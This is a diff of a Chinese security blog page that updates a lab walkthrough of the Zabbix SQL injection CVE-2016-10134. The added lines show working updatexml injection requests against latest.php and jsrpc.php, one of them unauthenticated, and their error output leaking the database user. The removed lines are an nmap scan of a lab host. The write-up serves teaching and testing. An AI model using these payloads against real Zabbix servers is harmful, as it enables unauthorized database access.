@@ -49,7 +49,7 @@
         content="2022-03-23">
       <meta 
         property="og:article:modified_time" 
-        content="2022-04-02">
+        content="2022-07-25">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -329,7 +329,7 @@
     
     
       <span class="dot"></span>
-      <span>227 words</span>
+      <span>380 words</span>
     
   </div>
   
@@ -368,34 +368,16 @@
     <h2 id="0-_u9776_u573A_u642D_u5EFA"><a href="#0-_u9776_u573A_u642D_u5EFA" class="headerlink" title="0.靶场搭建"></a>0.靶场搭建</h2><p>参考作者[jpSpaceX]写的文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jpSpaceX/articles/14900470.html">https://www.cnblogs.com/jpSpaceX/articles/14900470.html</a></p>
 <h2 id="1-Zabbix_latest-php_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><a href="#1-Zabbix_latest-php_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09" class="headerlink" title="1.Zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>1.Zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h2><p><strong><font color=green>影响版本 : Zabbix 2.2.* 3.0.0-3.0.3</font></strong><br><strong><font color=green>Path : zabbix/CVE-2016-10134</font></strong><br><strong><font color=green>Vul : SQL注入</font></strong>  </p>
 <blockquote>
-<p><strong>Breakthrough</strong></p>
+<p><strong>Breakthrough</strong><br>访问8080端口，发现能够guest免密码登陆系统。<br>注入点<strong>latest.php</strong>如下（需登陆系统，获取sid）：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//Request
+http://192.168.35.131:8080/latest.php?output<span class="token operator">=</span>ajax<span class="token operator">&amp;</span><span class="token assign-left variable">favobj</span><span class="token operator">=</span>toggle<span class="token operator">&amp;</span><span class="token assign-left variable">toggle_open_state</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>toggle_ids<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token assign-left variable">sid</span><span class="token operator">=</span><span class="token operator">&lt;</span>请求Cookie中zbx_sessionid的末16位<span class="token operator">></span>
+
+//Respone
+<span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"msg-bad"</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"msg-details"</span><span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_int, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">12</span>, <span class="token number">2</span>, <span class="token string">'web.latest.toggle'</span>, <span class="token string">'1'</span>, <span class="token number">2</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>/ul<span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"overlay-close-btn"</span> <span class="token assign-left variable">onclick</span><span class="token operator">=</span><span class="token string">"javascript: <span class="token variable"><span class="token variable">$(</span>this<span class="token variable">)</span></span>.closest('.msg-bad').remove();"</span> <span class="token assign-left variable">title</span><span class="token operator">=</span><span class="token string">"Close"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>注入点<strong>jsrpc.php</strong>如下（无需登陆系统）：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//Request
+http://192.168.35.131:8080/jsrpc.php?type<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span><span class="token assign-left variable">mode</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">method</span><span class="token operator">=</span>screen.get<span class="token operator">&amp;</span><span class="token assign-left variable">profileIdx</span><span class="token operator">=</span>web.item.graph<span class="token operator">&amp;</span><span class="token assign-left variable">resourcetype</span><span class="token operator">=</span><span class="token number">17</span><span class="token operator">&amp;</span><span class="token assign-left variable">profileIdx2</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span>
+
+//Respone
+<span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_int, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">12</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.period'</span>, <span class="token string">'3600'</span>, <span class="token number">2</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_str, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">13</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.stime'</span>, <span class="token string">'20220725134554'</span>, <span class="token number">3</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_int, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">14</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.isnow'</span>, <span class="token string">'1'</span>, <span class="token number">2</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>/ul<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
-<blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools<span class="token punctuation">]</span>
-└─<span class="token comment"># nmap 192.168.228.3 -A     </span>
-Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-03-23 09:52 CST
-Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.228.3
-Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00036s latency<span class="token punctuation">)</span>.
-Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
-PORT     STATE SERVICE VERSION
-<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Ubuntu 5ubuntu1.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
-<span class="token operator">|</span> ssh-hostkey: 
-<span class="token operator">|</span>   <span class="token number">3072</span> e0:5e:a5:f0:6b:81:54:0b:54:b8:eb:69:2d:c8:77:49 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
-<span class="token operator">|</span>   <span class="token number">256</span> e9:7f:3c:a0:41:9c:d8:72:85:c7:7f:ee:13:b0:7a:e7 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
-<span class="token operator">|</span>_  <span class="token number">256</span> 7d:cf:7e:fb:77:38:8a:d0:48:97:43:f3:be:fb:f9:8d <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
-<span class="token number">8080</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.33 <span class="token variable"><span class="token punctuation">((</span>Unix<span class="token punctuation">))</span></span>
-<span class="token operator">|</span> http-robots.txt: <span class="token number">2</span> disallowed entries 
-<span class="token operator">|</span>_/ /zabbix/".
-<span class="token operator">|</span>_http-title: Zabbix
-<span class="token operator">|</span> http-cookie-flags: 
-<span class="token operator">|</span>   /: 
-<span class="token operator">|</span>     zbx_sessionid: 
-<span class="token operator">|</span>       httponly flag not <span class="token builtin class-name">set</span>
-<span class="token operator">|</span>     PHPSESSID: 
-<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
-<span class="token operator">|</span> http-open-proxy: Potentially OPEN proxy.
-<span class="token operator">|</span>_Methods supported:CONNECTION
-<span class="token operator">|</span>_http-server-header: Apache/2.4.33 <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
 
   </div>
   <div>
@@ -595,15 +577,39 @@ PORT     STATE SERVICE VERSION
   <div class="tags-list">
     
       <a 
-        href="/tags/Vulnhub/" 
-        title="Vulnhub">
-        <div class="tags-list-item">Vulnhub</div>
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
       </a>
     
       <a 
-        href="/tags/%E6%8F%90%E6%9D%83/" 
-        title="提权">
-        <div class="tags-list-item">提权</div>
+        href="/tags/FileInclusion/" 
+        title="FileInclusion">
+        <div class="tags-list-item">FileInclusion</div>
+      </a>
+    
+      <a 
+        href="/tags/SQL/" 
+        title="SQL">
+        <div class="tags-list-item">SQL</div>
+      </a>
+    
+      <a 
+        href="/tags/CommandInjection/" 
+        title="CommandInjection">
+        <div class="tags-list-item">CommandInjection</div>
+      </a>
+    
+      <a 
+        href="/tags/Linux/" 
+        title="Linux">
+        <div class="tags-list-item">Linux</div>
+      </a>
+    
+      <a 
+        href="/tags/Tools/" 
+        title="Tools">
+        <div class="tags-list-item">Tools</div>
       </a>
     
       <a 
@@ -613,81 +619,57 @@ PORT     STATE SERVICE VERSION
       </a>
     
       <a 
-        href="/tags/Metasoploit/" 
-        title="Metasoploit">
-        <div class="tags-list-item">Metasoploit</div>
+        href="/tags/CGI/" 
+        title="CGI">
+        <div class="tags-list-item">CGI</div>
       </a>
     
       <a 
-        href="/tags/Msfvenom/" 
-        title="Msfvenom">
-        <div class="tags-list-item">Msfvenom</div>
+        href="/tags/HTTProxy/" 
+        title="HTTProxy">
+        <div class="tags-list-item">HTTProxy</div>
       </a>
     
       <a 
-        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
-        title="反弹shell">
-        <div class="tags-list-item">反弹shell</div>
+        href="/tags/Fastjson/" 
+        title="Fastjson">
+        <div class="tags-list-item">Fastjson</div>
       </a>
     
       <a 
-        href="/tags/DVWA/" 
-        title="DVWA">
-        <div class="tags-list-item">DVWA</div>
+        href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" 
+        title="反序列化">
+        <div class="tags-list-item">反序列化</div>
       </a>
     
       <a 
-        href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" 
-        title="代码审计">
-        <div class="tags-list-item">代码审计</div>
+        href="/tags/Flink/" 
+        title="Flink">
+        <div class="tags-list-item">Flink</div>
       </a>
     
       <a 
-        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
-        title="SSH端口转发">
-        <div class="tags-list-item">SSH端口转发</div>
+        href="/tags/Httpd/" 
+        title="Httpd">
+        <div class="tags-list-item">Httpd</div>
       </a>
     
       <a 
-        href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" 
-        title="内网穿透">
-        <div class="tags-list-item">内网穿透</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
       </a>
     
       <a 
-        href="/tags/SSH%E7%88%86%E7%A0%B4/" 
-        title="SSH爆破">
-        <div class="tags-list-item">SSH爆破</div>
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
       </a>
     
       <a 
-        href="/tags/searchsploit/" 
-        title="searchsploit">
-        <div class="tags-list-item">searchsploit</div>
-      </a>
-    
-      <a 
-        href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" 
-        title="脏牛提权">
-        <div class="tags-list-item">脏牛提权</div>
-      </a>
-    
-      <a 
-        href="/tags/redis/" 
-        title="redis">
-        <div class="tags-list-item">redis</div>
-      </a>
-    
-      <a 
-        href="/tags/XSS/" 
-        title="XSS">
-        <div class="tags-list-item">XSS</div>
-      </a>
-    
-      <a 
-        href="/tags/AES/" 
-        title="AES">
-        <div class="tags-list-item">AES</div>
+        href="/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" 
+        title="目录穿越">
+        <div class="tags-list-item">目录穿越</div>
       </a>
     
   </div>
